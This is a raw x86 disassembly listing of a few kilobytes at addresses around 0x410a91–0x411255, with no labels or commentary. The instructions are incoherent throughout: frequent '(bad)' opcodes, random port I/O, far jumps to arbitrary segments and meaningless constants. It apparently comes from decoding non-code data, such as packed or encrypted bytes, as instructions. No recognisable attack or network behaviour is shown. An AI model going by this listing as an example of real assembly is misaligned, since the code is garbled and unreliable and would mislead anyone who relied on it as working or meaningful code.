  410a91:	pusha  
  410a92:	int    0x4e
  410a94:	and    bl,dl
  410a96:	mov    ah,0xa8
  410a98:	into   
  410a99:	addr16 out dx,al
  410a9b:	jecxz  0x410afa
  410a9d:	dec    ebp
  410a9e:	loop   0x410ae3
  410aa0:	and    eax,edx
  410aa2:	lea    ebx,[edi-0x373477dc]
  410aa8:	fidivr WORD PTR [ebx+0x51]
  410aab:	xchg   DWORD PTR [esi-0x9de117b],esp
  410ab1:	jge    0x410a71
  410ab3:	std    
  410ab4:	sub    ebx,DWORD PTR [esi*2+0x69efa19f]
  410abb:	mov    bl,0x5e
  410abd:	mov    al,0xa
  410abf:	mov    bh,0x7a
  410ac1:	shr    esi,cl
  410ac3:	fidiv  WORD PTR [edx+0x33b16d54]
  410ac9:	xchg   edi,eax
  410aca:	icebp  
  410acb:	lods   al,BYTE PTR ds:[esi]
  410acc:	jg     0x410a56
  410ace:	out    dx,al
  410acf:	js     0x410b3c
  410ad1:	cwde   
  410ad2:	mov    bh,0x3b
  410ad4:	scas   al,BYTE PTR es:[edi]
  410ad5:	cmp    DWORD PTR [esi-0x25],ecx
  410ad8:	pop    ebx
  410ad9:	leave  
  410ada:	xor    DWORD PTR [edi],ebp
  410adc:	inc    ecx
  410add:	add    DWORD PTR [edi-0x20262392],ebp
  410ae3:	mov    al,ds:0x81148cb1
  410ae8:	adc    ebp,DWORD PTR [esi-0x58833101]
  410aee:	out    dx,al
  410aef:	rcl    DWORD PTR [ecx+0x40],0x38
  410af3:	sbb    eax,0x8ff362ea
  410af8:	mov    eax,0xca0f732
  410afd:	and    ebx,esp
  410aff:	jp     0x410b62
  410b01:	and    al,0xee
  410b03:	ss in  eax,dx
  410b05:	dec    edx
  410b06:	das    
  410b07:	gs push 0x6f
  410b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b0b:	(bad)  
  410b0c:	fldenv [ebp+0x57ec6dfd]
  410b12:	in     al,0xf8
  410b14:	mov    ds:0x68446ece,al
  410b19:	in     al,dx
  410b1a:	test   al,0xf
  410b1c:	push   ecx
  410b1d:	mov    ebx,eax
  410b1f:	mov    bl,BYTE PTR [esi+0x33a073af]
  410b25:	jb     0x410b72
  410b27:	mov    eax,ds:0x329bae9
  410b2c:	mov    ah,0x6
  410b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b2f:	into   
  410b30:	fs paddq mm2,mm5
  410b34:	repnz add BYTE PTR [edi-0x7f],ah
  410b38:	dec    ecx
  410b39:	add    DWORD PTR [ecx],esi
  410b3b:	lds    ebp,FWORD PTR [esi+0x66]
  410b3e:	mul    DWORD PTR [eax+0x3e852c2b]
  410b44:	push   0x7b94209d
  410b49:	pusha  
  410b4a:	in     al,0xf7
  410b4c:	push   cs
  410b4d:	repz adc eax,0x20610bc6
  410b53:	out    dx,eax
  410b54:	ja     0x410bc9
  410b56:	jp     0x410b3e
  410b58:	int3   
  410b59:	aas    
  410b5a:	out    dx,al
  410b5b:	ror    DWORD PTR [ebp-0x2c],0xe4
  410b5f:	mov    DWORD PTR [eax-0x1f5f4152],edi
  410b65:	jmp    0x477f:0xf360f6b2
  410b6c:	pop    esi
  410b6d:	lods   al,BYTE PTR ds:[esi]
  410b6e:	sub    al,0x38
  410b70:	outs   dx,DWORD PTR ds:[esi]
  410b71:	xor    BYTE PTR [eax-0x5a9f411b],ch
  410b77:	lods   al,BYTE PTR ds:[esi]
  410b78:	pushf  
  410b79:	push   ds
  410b7a:	cmp    bh,BYTE PTR [esi-0x74]
  410b7d:	and    bh,ah
  410b7f:	sbb    eax,0xde72eb03
  410b84:	(bad)  
  410b85:	out    dx,eax
  410b86:	adc    eax,ebp
  410b88:	sbb    esp,DWORD PTR [ecx-0xc]
  410b8b:	or     ah,dh
  410b8d:	add    al,0x6
  410b8f:	and    al,0x84
  410b91:	into   
  410b92:	out    dx,al
  410b93:	gs xchg ecx,eax
  410b95:	jmp    0x8e0a:0x626270ac
  410b9c:	mov    dl,0x38
  410b9e:	add    esi,eax
  410ba0:	mov    cl,0x49
  410ba2:	jne    0x410bbf
  410ba4:	cmp    ebx,DWORD PTR [edx]
  410ba6:	out    dx,al
  410ba7:	dec    edx
  410ba8:	add    eax,0x5e0d9d8b
  410bad:	xor    esp,DWORD PTR [esi-0x51]
  410bb0:	adc    eax,0x25205101
  410bb5:	and    al,0x76
  410bb7:	mov    ds:0x8656a974,al
  410bbc:	dec    eax
  410bbd:	mov    WORD PTR [esi-0x12b34510],gs
  410bc3:	jo     0x410c34
  410bc5:	push   ds
  410bc6:	mov    ?,WORD PTR [ecx]
  410bc8:	push   ss
  410bc9:	int3   
  410bca:	push   ds
  410bcb:	dec    esi
  410bcc:	cld    
  410bcd:	pusha  
  410bce:	lds    eax,FWORD PTR [edx]
  410bd0:	js     0x410c2a
  410bd2:	xor    al,0x26
  410bd4:	dec    esi
  410bd5:	(bad)  
  410bd6:	out    dx,al
  410bd7:	xlat   BYTE PTR ds:[ebx]
  410bd8:	push   ecx
  410bd9:	mov    eax,0xf35f0f04
  410bde:	and    dl,BYTE PTR [edi+eax*1+0x43a0cc63]
  410be5:	pop    edx
  410be6:	fidivr DWORD PTR [ebx]
  410be8:	ds xor eax,0x1e46e6ee
  410bee:	sbb    BYTE PTR [eax-0x5d73bb2a],cl
  410bf4:	adc    esp,DWORD PTR [esi]
  410bf6:	and    DWORD PTR [edx-0x69],ebp
  410bf9:	fwait
  410bfa:	and    bh,BYTE PTR [ebp-0x57]
  410bfd:	dec    esp
  410bfe:	out    dx,al
  410bff:	pop    esp
  410c00:	outs   dx,BYTE PTR ds:[esi]
  410c01:	sub    al,0xb9
  410c03:	adc    eax,0xa128b600
  410c08:	jbe    0x410ba1
  410c0a:	inc    esi
  410c0b:	dec    edx
  410c0c:	mov    eax,ds:0x5f2bb6bf
  410c11:	std    
  410c12:	pop    ebx
  410c13:	mov    dl,0xe2
  410c15:	xchg   ebp,eax
  410c16:	mov    ebp,0xcfb7cf68
  410c1b:	mov    al,ds:0xc21c7b3f
  410c20:	fsub   DWORD PTR [edi]
  410c22:	xor    eax,0x549f88a7
  410c27:	rcr    DWORD PTR [esi-0x2],1
  410c2a:	fst    DWORD PTR [esi]
  410c2c:	(bad)  
  410c2d:	cdq    
  410c2e:	or     dl,BYTE PTR [edx+eiz*1+0x60]
  410c32:	xchg   ebp,eax
  410c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c34:	mov    edi,DWORD PTR [ebx]
  410c36:	mov    dh,0x9f
  410c38:	push   ss
  410c39:	popf   
  410c3a:	fild   QWORD PTR [edi+0x5e]
  410c3d:	xor    eax,0xcb0bd163
  410c42:	add    edi,DWORD PTR [eax-0xf]
  410c45:	pusha  
  410c46:	(bad)  
  410c48:	iret   
  410c49:	xchg   esp,eax
  410c4a:	xchg   DWORD PTR [eax],eax
  410c4c:	test   eax,0x7853ee3f
  410c51:	cmp    ebx,ebx
  410c53:	push   cs
  410c54:	fmulp  st(1),st
  410c56:	inc    eax
  410c57:	mov    eax,ds:0xa7657bba
  410c5c:	mov    al,0x8a
  410c5e:	cs xchg ebp,eax
  410c60:	mov    dh,0x2e
  410c62:	out    dx,al
  410c63:	push   eax
  410c64:	adc    edi,DWORD PTR [edx-0x5d2bbed9]
  410c6a:	xlat   BYTE PTR ds:[ebx]
  410c6b:	mov    ds:0x1ccb0fde,eax
  410c70:	jecxz  0x410c05
  410c72:	outs   dx,BYTE PTR ds:[esi]
  410c73:	test   al,0x87
  410c75:	cmp    bh,ch
  410c77:	mov    ch,0x11
  410c79:	and    ebp,DWORD PTR [eax+eiz*1+0x43f8ef84]
  410c80:	cmp    ah,BYTE PTR [ecx-0x1d]
  410c83:	sub    bh,BYTE PTR [ebx]
  410c85:	sahf   
  410c86:	mov    ebp,0xeec2feed
  410c8b:	das    
  410c8c:	ss jnp 0x410c4f
  410c8f:	aas    
  410c90:	aaa    
  410c91:	(bad)  
  410c92:	mov    ch,0x9f
  410c94:	xor    al,0xea
  410c96:	mov    al,BYTE PTR [ebx-0x62]
  410c99:	xor    dl,BYTE PTR [ebx-0x1107fc7e]
  410c9f:	jns    0x410c8a
  410ca1:	add    eax,0xc29517ba
  410ca6:	sub    DWORD PTR [edi-0x5be920cf],edx
  410cac:	or     bl,BYTE PTR [ebp-0x67]
  410caf:	cld    
  410cb0:	xchg   esi,eax
  410cb1:	inc    ebp
  410cb2:	outs   dx,BYTE PTR ds:[esi]
  410cb3:	xchg   BYTE PTR [esi-0x7f],bl
  410cb6:	scas   eax,DWORD PTR es:[edi]
  410cb7:	jp     0x410cc5
  410cb9:	add    DWORD PTR [si],esp
  410cbc:	mov    eax,ds:0xe8c92549
  410cc1:	pusha  
  410cc2:	cs inc esi
  410cc4:	mov    eax,0x70c3e5c4
  410cc9:	jmp    0x50f4:0x255ea6e3
  410cd0:	ja     0x410d26
  410cd2:	fist   WORD PTR [ecx]
  410cd4:	mov    cl,0x5f
  410cd6:	pusha  
  410cd7:	retf   0x8d47
  410cda:	(bad)  
  410cdb:	jmp    0x410c6f
  410cdd:	nop
  410cde:	and    ch,BYTE PTR [ebx+0x57b2e667]
  410ce4:	mov    eax,0x9fb9d5e0
  410ce9:	mov    ah,0x57
  410ceb:	int    0xb6
  410ced:	pusha  
  410cee:	fdiv   st,st(1)
  410cf0:	es popa 
  410cf2:	sub    al,0xd6
  410cf4:	xor    al,0x2
  410cf6:	out    0x9e,al
  410cf8:	aad    0xea
  410cfa:	loope  0x410cf3
  410cfc:	pop    edi
  410cfd:	jp     0x410cc7
  410cff:	xchg   BYTE PTR [edx+0x37190fc1],al
  410d05:	(bad)  
  410d06:	dec    edi
  410d07:	nop
  410d08:	mov    BYTE PTR [edx],bl
  410d0a:	xchg   esi,eax
  410d0b:	mov    eax,ds:0x7159211f
  410d10:	sbb    ecx,DWORD PTR [esi+ecx*2]
  410d13:	sbb    BYTE PTR [esi+0x2a],0x12
  410d17:	scas   eax,DWORD PTR es:[edi]
  410d18:	inc    esi
  410d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d1a:	(bad)  
  410d1b:	inc    BYTE PTR [edx+0x5afcec5d]
  410d21:	sub    esp,ebx
  410d23:	aad    0x8e
  410d25:	(bad)  
  410d26:	cld    
  410d27:	dec    esi
  410d28:	pop    ebx
  410d29:	mov    cl,0x5c
  410d2b:	xlat   BYTE PTR ds:[ebx]
  410d2c:	push   esi
  410d2d:	inc    ebp
  410d2e:	dec    esi
  410d2f:	or     dl,BYTE PTR [edi-0x105ee63b]
  410d35:	int3   
  410d36:	mov    ecx,DWORD PTR [edi-0x4db1468d]
  410d3c:	xor    edi,ecx
  410d3e:	jecxz  0x410d0e
  410d40:	jge    0x410d02
  410d42:	aaa    
  410d43:	dec    ecx
  410d44:	push   cs
  410d45:	sub    al,0x27
  410d47:	mov    eax,ds:0xc56a0692
  410d4c:	sbb    al,BYTE PTR [esi]
  410d4e:	mul    cl
  410d50:	pop    esi
  410d51:	adc    eax,0x9209203e
  410d56:	and    BYTE PTR [eax+0x55],cl
  410d59:	mov    bl,0x58
  410d5b:	mov    eax,ds:0x3049839d
  410d60:	out    dx,eax
  410d61:	int    0xf6
  410d63:	xor    eax,0x95bc905e
  410d68:	or     DWORD PTR ds:[edi-0xf],ebx
  410d6c:	mul    BYTE PTR [eax-0x3d]
  410d6f:	dec    esp
  410d70:	mov    ds:0xc88b49e1,al
  410d75:	jle    0x410d65
  410d77:	add    BYTE PTR [esi-0x6b9b791b],0xe0
  410d7e:	jp     0x410d89
  410d80:	and    esp,DWORD PTR [ecx+0x5c]
  410d83:	ret    0x6875
  410d86:	sub    eax,0x26200438
  410d8b:	rol    DWORD PTR [ebp+0xb1b38d9],0x78
  410d92:	fsubrp st(4),st
  410d94:	sub    BYTE PTR [edi-0x1bea5eea],0x6e
  410d9b:	(bad)  
  410d9c:	sub    DWORD PTR [ebp+edx*2-0x19c7a163],edi
  410da3:	adc    BYTE PTR [ebp+0x9],bl
  410da6:	lahf   
  410da7:	or     BYTE PTR [esi+0x5f],cl
  410daa:	std    
  410dab:	cli    
  410dac:	xchg   ah,dl
  410dae:	ss or  al,0x7e
  410db1:	(bad)  
  410db2:	mov    ch,0xf7
  410db4:	pusha  
  410db5:	cmp    BYTE PTR [ebp+0x39],bl
  410db8:	mov    ebp,0x9562acbd
  410dbd:	or     ebp,esi
  410dbf:	jnp    0x410dbf
  410dc1:	daa    
  410dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410dc3:	and    DWORD PTR [esi+0x2b],ebx
  410dc6:	(bad)  
  410dc7:	std    
  410dc8:	lods   al,BYTE PTR ds:[esi]
  410dc9:	and    al,0x3b
  410dcb:	push   ss
  410dcc:	sub    eax,0x2e805d5a
  410dd1:	imul   ecx,edx,0x21440020
  410dd7:	lds    ebx,FWORD PTR [esi+0x30]
  410dda:	push   cs
  410ddb:	adc    DWORD PTR [esi+ebp*1+0x441a8f7c],ebp
  410de2:	add    al,0x7
  410de4:	sti    
  410de5:	mov    al,ds:0xd623334d
  410dea:	iret   
  410deb:	mov    ds:0xe6f91c67,eax
  410df0:	cmp    cl,BYTE PTR [esi+ebp*2+0x3337967f]
  410df7:	push   0x7277595e
  410dfc:	push   edx
  410dfd:	push   esp
  410dfe:	ret    0xbc22
  410e01:	pusha  
  410e02:	and    cl,BYTE PTR ds:[ebx+eiz*2]
  410e06:	adc    DWORD PTR [eax],0x69
  410e09:	ret    
  410e0a:	fst    st(0)
  410e0c:	pop    esi
  410e0d:	std    
  410e0e:	int3   
  410e0f:	mov    eax,ds:0x46c2f689
  410e14:	iret   
  410e15:	pusha  
  410e16:	mov    cl,0x40
  410e18:	mov    esp,fs
  410e1a:	scas   al,BYTE PTR es:[edi]
  410e1b:	test   al,0x14
  410e1d:	call   0x3aefac10
  410e22:	push   eax
  410e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e24:	push   0x14
  410e26:	stos   DWORD PTR es:[edi],eax
  410e27:	(bad)  
  410e29:	cmp    esi,ebp
  410e2b:	mov    dl,0x77
  410e2d:	or     DWORD PTR [eax+eax*8],esp
  410e30:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  410e32:	loopne 0x410e18
  410e34:	addr16 xor ah,dh
  410e37:	push   ebp
  410e38:	mov    dh,0x59
  410e3a:	and    dh,bl
  410e3c:	std    
  410e3d:	add    BYTE PTR [ecx-0x32d18127],bl
  410e43:	sahf   
  410e44:	(bad)  
  410e45:	xor    DWORD PTR [esi-0x5d],ebp
  410e48:	arpl   bp,si
  410e4a:	scas   al,BYTE PTR es:[edi]
  410e4b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  410e4d:	sub    al,0x83
  410e4f:	mov    edx,gs
  410e51:	mov    gs,esi
  410e53:	nop
  410e54:	movups xmm3,XMMWORD PTR [edx]
  410e57:	mov    al,BYTE PTR [ecx-0x75]
  410e5a:	fsubr  QWORD PTR [esi-0x6b]
  410e5d:	pop    ecx
  410e5e:	jb     0x410e13
  410e60:	retf   
  410e61:	stos   BYTE PTR es:[edi],al
  410e62:	and    DWORD PTR gs:[edx+0x5fab0b15],ecx
  410e69:	cld    
  410e6a:	xor    DWORD PTR [eax],esi
  410e6c:	dec    edx
  410e6d:	int3   
  410e6e:	iret   
  410e6f:	adc    bl,ch
  410e71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e72:	xor    esp,DWORD PTR [ecx-0x6fc082f4]
  410e78:	sub    bl,ah
  410e7a:	cdq    
  410e7b:	push   edi
  410e7c:	pop    esi
  410e7d:	jbe    0x410ec8
  410e7f:	mov    edi,0x1e3ee67e
  410e84:	(bad)  
  410e85:	dec    edx
  410e86:	fnstenv [esi-0x25]
  410e89:	pusha  
  410e8a:	outs   dx,BYTE PTR ds:[esi]
  410e8b:	icebp  
  410e8c:	inc    esp
  410e8e:	enter  0x59b5,0x44
  410e92:	ret    
  410e93:	nop
  410e94:	push   ebp
  410e95:	sub    BYTE PTR [ebx-0x2d],0xf1
  410e99:	call   0x60de90ea
  410e9e:	ins    BYTE PTR es:[edi],dx
  410e9f:	sbb    ebp,DWORD PTR [ecx-0x58]
  410ea2:	sti    
  410ea3:	cli    
  410ea4:	push   edi
  410ea5:	out    dx,eax
  410ea6:	out    dx,al
  410ea7:	nop
  410ea8:	cli    
  410ea9:	jg     0x410ef4
  410eab:	inc    ecx
  410eac:	add    DWORD PTR [edi],edi
  410eae:	push   edi
  410eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410eb0:	and    eax,0x7d9b86c8
  410eb5:	ret    
  410eb6:	xchg   esi,eax
  410eb7:	pop    ds
  410eb8:	dec    ebx
  410eb9:	loop   0x410ea9
  410ebb:	cmp    ecx,DWORD PTR [edi-0x75a41bc3]
  410ec1:	push   0xd5e2a557
  410ec6:	adc    DWORD PTR [esi+ebx*8],edx
  410ec9:	fwait
  410eca:	adc    eax,0x937faf24
  410ecf:	sahf   
  410ed0:	(bad)  
  410ed1:	cli    
  410ed2:	pop    ss
  410ed3:	add    eax,0xce32135e
  410ed8:	dec    ebx
  410ed9:	add    BYTE PTR [edx-0x4d9f2870],ah
  410edf:	call   0x6ad991b1
  410ee4:	pushf  
  410ee5:	leave  
  410ee6:	mov    dh,0xb6
  410ee8:	xchg   esp,eax
  410ee9:	pusha  
  410eea:	or     al,0x4b
  410eec:	out    0x58,al
  410eee:	add    ecx,DWORD PTR [edx]
  410ef0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ef1:	mov    al,ds:0xebacfb98
  410ef6:	in     al,dx
  410ef7:	or     edx,DWORD PTR [edx+0x9]
  410efa:	leave  
  410efb:	div    DWORD PTR [edi+0x34a6e760]
  410f01:	repnz int 0x12
  410f04:	jl     0x410f66
  410f06:	push   esp
  410f07:	push   ds
  410f08:	je     0x410eb1
  410f0a:	mov    dh,0xdc
  410f0c:	call   0x7559:0x73fab6b5
  410f13:	jmp    0x410f4b
  410f15:	ds mov esi,0xdf7bad07
  410f1b:	mov    al,ds:0x22619f0d
  410f20:	test   al,0x19
  410f22:	ds jns 0x410f83
  410f25:	cmp    eax,0x9560a998
  410f2a:	cmp    eax,0x8f4f10be
  410f2f:	pop    es
  410f30:	dec    esi
  410f31:	inc    esp
  410f32:	(bad)  
  410f33:	out    0x88,eax
  410f35:	mov    ebp,0x64a5d16c
  410f3a:	mov    eax,0x9b575bb1
  410f3f:	call   0xbc86:0xa165dcbc
  410f46:	add    al,0x54
  410f48:	pop    edi
  410f49:	popa   
  410f4a:	push   esp
  410f4b:	sbb    al,0x61
  410f4d:	cmp    eax,0x5c4557f3
  410f52:	jmp    0x410f98
  410f54:	clc    
  410f55:	retf   
  410f56:	sub    ebp,DWORD PTR [ebx-0x1d485f8f]
  410f5c:	jae    0x410fbe
  410f5e:	xor    eax,0x397fb03d
  410f63:	data16 aad 0xb5
  410f66:	out    dx,al
  410f67:	mov    cl,0xe1
  410f69:	cli    
  410f6a:	hlt    
  410f6b:	and    al,0xeb
  410f6d:	test   BYTE PTR [edi],bh
  410f6f:	fldcw  WORD PTR [edi-0x4589119d]
  410f75:	jg     0x410efd
  410f77:	inc    ecx
  410f78:	xor    ah,BYTE PTR [edx+0x26]
  410f7b:	retf   0xd306
  410f7e:	inc    ebp
  410f7f:	xchg   esp,eax
  410f80:	add    al,BYTE PTR [ecx]
  410f82:	xchg   edx,eax
  410f83:	mov    al,ds:0x6ae4162a
  410f88:	mov    esp,DWORD PTR [eax-0x64]
  410f8b:	les    ebx,FWORD PTR [esi+0x6d458340]
  410f91:	jns    0x410f81
  410f93:	inc    edi
  410f94:	ret    0x2b5c
  410f97:	mov    ecx,0xa53c17ac
  410f9c:	inc    ecx
  410f9d:	repz or al,0xf
  410fa0:	loopne 0x410f82
  410fa2:	xchg   esi,eax
  410fa3:	add    BYTE PTR ds:0x3aabee97,dl
  410fa9:	inc    ecx
  410faa:	mov    ebx,esp
  410fac:	arpl   WORD PTR [edx+0x2],di
  410faf:	mov    eax,ds:0x3e95187c
  410fb4:	mov    cs,WORD PTR [ebp-0x68]
  410fb7:	sbb    ebx,DWORD PTR [esi+0x4d]
  410fba:	dec    edx
  410fbb:	jnp    0x411009
  410fbd:	imul   BYTE PTR [esi]
  410fbf:	scas   eax,DWORD PTR es:[edi]
  410fc0:	(bad)  [eax+0x25]
  410fc3:	daa    
  410fc4:	dec    eax
  410fc5:	pusha  
  410fc6:	inc    eax
  410fc7:	cld    
  410fc8:	inc    DWORD PTR [edi]
  410fca:	add    BYTE PTR [esi+0x21],bh
  410fcd:	loop   0x410f50
  410fcf:	fxam   
  410fd1:	out    0x1e,eax
  410fd3:	jmp    0x8f3354c4
  410fd8:	fiadd  WORD PTR [edx-0xd]
  410fdb:	out    0x86,eax
  410fdd:	or     DWORD PTR [ebp+0x31],ebx
  410fe0:	add    DWORD PTR [eax+0x36],0xeeaaebfd
  410fe7:	mov    esp,0x80b016d0
  410fec:	(bad)  
  410fed:	cmp    esp,DWORD PTR [edi]
  410fef:	mov    eax,ds:0x7f894538
  410ff4:	xor    bl,BYTE PTR ds:0x505edc66
  410ffa:	(bad)  
  410ffb:	xlat   BYTE PTR ds:[ebx]
  410ffc:	out    dx,eax
  410ffd:	(bad)  
  410ffe:	mov    ecx,0x935f9526
  411003:	stos   DWORD PTR es:[edi],eax
  411004:	sub    al,0x55
  411006:	or     eax,0xaf98cae5
  41100b:	jne    0x41106a
  41100d:	mov    DWORD PTR [esi-0x686d6baa],eax
  411013:	inc    esi
  411014:	jb     0x410fac
  411016:	mov    BYTE PTR [ecx-0x670e280c],ah
  41101c:	scas   eax,DWORD PTR es:[edi]
  41101d:	test   al,0x19
  41101f:	pop    eax
  411020:	pop    esi
  411021:	imul   esp,DWORD PTR [eax],0xd0bbb465
  411027:	xchg   esi,esi
  411029:	pusha  
  41102a:	jp     0x41107f
  41102c:	cwde   
  41102d:	push   esp
  41102e:	dec    edi
  41102f:	pop    edi
  411030:	mov    bl,BYTE PTR [ecx]
  411032:	xchg   BYTE PTR [edx+0x7ebfd146],ah
  411038:	pop    esi
  411039:	es push 0x62674446
  41103f:	push   cs
  411040:	pushf  
  411041:	pusha  
  411042:	and    edi,DWORD PTR ds:0x7ba8c80d
  411048:	sbb    eax,0xaf87ee91
  41104d:	dec    edi
  41104e:	push   eax
  41104f:	clc    
  411050:	and    eax,0x50a0f5d0
  411055:	(bad)  
  411056:	(bad)  
  411058:	loop   0x41105b
  41105a:	mov    dh,BYTE PTR [esi+0x1af6945e]
  411060:	xchg   ecx,eax
  411061:	sbb    DWORD PTR [ecx-0x7d9f6a65],esi
  411067:	ret    0xc1c
  41106a:	sbb    eax,0xeea0a6b5
  41106f:	ins    BYTE PTR es:[edi],dx
  411070:	and    eax,0x8135416
  411075:	dec    esp
  411076:	xor    ah,BYTE PTR [ecx-0x6690a8fd]
  41107c:	add    eax,0x5e0249d0
  411081:	dec    eax
  411082:	cmp    ah,cl
  411084:	ficomp WORD PTR [ebx+0x26775625]
  41108a:	sub    esp,DWORD PTR [ecx+0x1bb85dd6]
  411090:	mov    cl,0x3d
  411092:	in     eax,0x9b
  411094:	pop    ebx
  411095:	add    al,dh
  411097:	fbld   TBYTE PTR [edx]
  411099:	sbb    BYTE PTR [esi+0x6],0x85
  41109d:	sar    esi,0xa0
  4110a0:	iret   
  4110a1:	ret    0xae39
  4110a4:	add    BYTE PTR [edi+0x0],al
  4110a7:	mov    BYTE PTR [esi+0x2],bl
  4110aa:	sub    eax,0x78fda59c
  4110af:	sub    eax,0x8e0e60f2
  4110b4:	mov    esi,0x6bbf7665
  4110b9:	cmp    esi,ebp
  4110bb:	dec    ebx
  4110bc:	fild   WORD PTR ds:0xebaf5f9d
  4110c2:	inc    edx
  4110c3:	mov    ds:0x91d52ea,al
  4110c8:	ins    DWORD PTR es:[edi],dx
  4110c9:	push   cs
  4110ca:	mul    BYTE PTR [edi+ebp*1-0x4]
  4110ce:	out    dx,al
  4110cf:	neg    BYTE PTR [ebp*4+0x3985556c]
  4110d6:	push   es
  4110d7:	mov    eax,ds:0x6147562a
  4110dc:	push   0x5e3cd373
  4110e1:	aad    0x61
  4110e3:	jecxz  0x4110db
  4110e5:	mov    BYTE PTR [edi+edx*1],ah
  4110e8:	cwde   
  4110e9:	pusha  
  4110ea:	adc    al,0x85
  4110ec:	add    ah,al
  4110ee:	add    BYTE PTR ds:0x4dee3ab9,ah
  4110f4:	xor    cl,BYTE PTR [ebp+0x34513984]
  4110fa:	inc    edx
  4110fb:	mov    eax,ds:0xc05940c3
  411100:	(bad)  
  411102:	add    bh,cl
  411104:	pop    esi
  411105:	cld    
  411106:	(bad)  
  411107:	in     eax,dx
  411108:	aaa    
  411109:	xor    DWORD PTR [edx],esp
  41110b:	aad    0x2a
  41110d:	shr    ecx,0xa0
  411110:	jae    0x4110dc
  411112:	lea    ebx,[edx+ebx*8-0x7]
  411116:	scas   eax,DWORD PTR es:[edi]
  411117:	push   ds
  411118:	pop    esi
  411119:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41111b:	mov    cl,0xf0
  41111d:	mov    ds:0x2d545a06,al
  411122:	loope  0x4110c4
  411124:	mov    eax,0x6822ed22
  411129:	dec    edx
  41112a:	in     al,dx
  41112b:	cli    
  41112c:	pop    esi
  41112d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41112e:	cmp    BYTE PTR [eax+0x4c],cl
  411131:	xchg   ebx,eax
  411132:	push   esp
  411133:	nop
  411134:	or     al,0x61
  411136:	dec    edi
  411137:	cmc    
  411138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411139:	cmp    eax,DWORD PTR [ecx]
  41113b:	xor    eax,0x6ce788cf
  411140:	mov    ch,0x1b
  411142:	pop    ds
  411143:	mov    ebp,0x4d96639e
  411148:	dec    esi
  411149:	popa   
  41114a:	retf   
  41114b:	add    al,0x2b
  41114d:	pop    ds
  41114e:	test   ecx,edx
  411150:	sbb    esp,esp
  411152:	out    dx,al
  411153:	les    ebx,FWORD PTR cs:[edx-0x28]
  411157:	push   cs
  411158:	inc    ebx
  411159:	addr16 mov edx,0x4cce2e9f
  41115f:	or     al,0x5e
  411161:	ret    0x723b
  411164:	pop    ebp
  411165:	xor    esp,edi
  411167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411168:	push   ds
  411169:	loopne 0x411157
  41116b:	popw   es
  41116d:	gs inc edx
  41116f:	loope  0x411135
  411171:	ins    DWORD PTR es:[edi],dx
  411172:	outs   dx,DWORD PTR ds:[esi]
  411173:	mov    eax,ds:0x4b8ed97f
  411178:	xchg   esi,eax
  411179:	push   esi
  41117a:	fisubr WORD PTR [ebx]
  41117c:	pop    esi
  41117d:	sti    
  41117e:	push   cs
  41117f:	mov    edi,0xdf87c9dc
  411184:	mov    dh,0x5e
  411186:	mov    ah,0x84
  411188:	jns    0x4111c4
  41118a:	std    
  41118b:	mov    BYTE PTR [esi+0x5efc0036],bl
  411191:	cmp    DWORD PTR [eax+0x231f5a9b],0x775e27de
  41119b:	jae    0x411149
  41119d:	or     al,0xf4
  41119f:	fcomp  DWORD PTR [esi+0x1]
  4111a2:	shl    DWORD PTR ds:0xc2e41df7,1
  4111a8:	mov    bh,BYTE PTR [edx+eax*1-0x1811be5f]
  4111af:	je     0x411141
  4111b1:	cs mov ah,0xc3
  4111b4:	pop    ebx
  4111b5:	cmp    eax,0x72ce682f
  4111ba:	into   
  4111bb:	ins    DWORD PTR es:[edi],dx
  4111bc:	cmp    eax,esp
  4111be:	dec    edx
  4111bf:	mov    eax,ds:0x631352ff
  4111c4:	(bad)  
  4111c5:	push   esp
  4111c6:	jmp    0x271d4030
  4111cb:	add    eax,0xa16fc1a1
  4111d0:	mov    ch,0x87
  4111d2:	stc    
  4111d3:	ret    0xac0f
  4111d6:	(bad)  
  4111d7:	fcomp  QWORD PTR [ebp-0x79]
  4111da:	pop    esi
  4111db:	jo     0x41123d
  4111dd:	push   ebx
  4111de:	push   edx
  4111df:	mov    ss,WORD PTR [edx+0x59774589]
  4111e5:	pusha  
  4111e6:	aas    
  4111e7:	loop   0x41121f
  4111e9:	dec    edi
  4111ea:	imul   esp,edi,0xfffffff4
  4111ed:	test   al,0xd3
  4111ef:	mov    ebx,0xdada605e
  4111f4:	dec    ebp
  4111f5:	data16 jns 0x41124e
  4111f8:	pop    edx
  4111f9:	popa   
  4111fa:	mov    si,0xab4a
  4111fe:	adc    bl,BYTE PTR [ebx-0x60fd9f0]
  411204:	mov    esp,0x22227ce6
  411209:	mov    eax,0x9b6a019c
  41120e:	mov    WORD PTR [ecx+0x56eddf3f],fs
  411214:	mov    ecx,DWORD PTR [eax-0x42a4791b]
  41121a:	test   eax,0xafd197bd
  41121f:	inc    eax
  411220:	xor    BYTE PTR [esi+0x60b91e98],ch
  411226:	cmc    
  411227:	push   es
  411228:	sahf   
  411229:	int3   
  41122a:	ret    0x940f
  41122d:	cmp    ebp,ebp
  41122f:	les    ecx,FWORD PTR [esi]
  411231:	mov    dl,0x69
  411233:	in     al,dx
  411234:	repz cs push edx
  411237:	mov    DWORD PTR [ecx],ebx
  411239:	popa   
  41123a:	sbb    ch,BYTE PTR [eax+0x408538dc]
  411240:	arpl   WORD PTR [ecx],si
  411242:	out    dx,al
  411243:	iret   
  411244:	int    0x67
  411246:	fs pop es
  411248:	(bad)  
  411249:	push   edx
  41124a:	popf   
  41124b:	mov    eax,ds:0x8003e032
  411250:	loopne 0x411210
  411252:	xchg   ebp,eax
  411253:	mov    dl,0x5d
  411255:	fsubr  st(1),st
